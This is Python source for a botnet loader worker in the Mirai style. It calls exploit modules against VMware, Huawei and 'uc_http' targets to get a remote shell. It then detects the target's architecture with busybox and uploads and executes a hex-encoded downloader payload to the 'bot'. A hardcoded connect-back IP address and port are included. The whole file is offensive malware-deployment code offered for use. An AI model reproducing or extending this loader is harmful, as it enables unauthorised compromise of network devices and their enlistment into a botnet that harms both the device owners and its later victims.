import threading
import time

from util_connection import *


class Worker(threading.Thread):
    def __init__(self, target_ip, target_port, attack_type, get_payload_cb):
        self.target_ip = target_ip
        self.target_port = target_port
        self.attack_type = attack_type
        self.get_payload_cb = get_payload_cb

        # Get localhost ip = ip public
        self.connect_back_ip = "95.179.152.63"
        self.connect_back_port = 7777
        self.username = None
        self.password = None
        self.hex_payloads = []
        self.exploit_func = None
        self.arch = None
        # TODO: Generate connect back ip, port
        if self.attack_type == "myvmware":
            from exploits.exploit4myvm import exploit_func as ex_func
            self.exploit_func = ex_func
        if self.attack_type == "uc_http":
            from exploits.exploit_generator import exploit_func as ex_func
            # from exploits.exploit4myvm import exploit_func as ex_func
            self.exploit_func = ex_func
        if self.attack_type == "huawei":
            from exploits.exploit_huawei import exploit_func as ex_func
            self.exploit_func = ex_func

        # TODO: Select attack vector from attack_type
        pass

    def run(self):
        # TODO: Start attack vector, get result include shell (by socket)
        conn = self.exploit_func(self.target_ip, self.target_port)
        print("Create conn done")
        time.sleep(3)
        conn.send("/bin/echo $\n")

        # Deploy dlr
        state = 0
        payload_pos = 0
        ret = -1
        while True:
            rdbuff = conn.recv(1024)
            if len(rdbuff) != 0:
                pass

            # Setup states machine
            if state == 0 and (':' in rdbuff or '>' in rdbuff or '$' in rdbuff or '#' in rdbuff or '%' in rdbuff):
                # TODO: Check writeable dir
                print("Got shell")
                state += 1
                conn.send(TOKEN_QUERY)
            elif state == 1:
                # TODO: Consume writeable dir and check arch
                if connection_consume(rdbuff):
                    state += 1
                conn.send("/bin/busybox cat /bin/echo\n")
                # conn.send(TOKEN_QUERY)
            elif state == 2:
                # Consume arch
                if self.arch is None:
                    self.arch = connection_consume_arch(rdbuff)
                    print("Detect arch of target --- {}".format(self.arch))
                    if self.arch == "Unknown":
                        # TODO: Move state to exit
                        pass
                    time.sleep(3)
                    conn.send(TOKEN_QUERY)
                else:
                    if connection_consume(rdbuff):
                        state += 1
                        # Get payload refer arch
                        self.hex_payloads = self.get_payload_cb(self.arch)
                    conn.send(TOKEN_QUERY)
            elif state == 3:
                if connection_consume(rdbuff):
                    if ret > 0:
                        state += 1
                    elif ret == 0:
                        payload_pos += 1

                    # Send dlr to bot
                    ret = connection_load_dlr(conn, self.hex_payloads, payload_pos)

            elif state == 4:
                if connection_consume(rdbuff):
                    print("Send dlr done, execute dlr")
                    break

        conn.close()
        pass
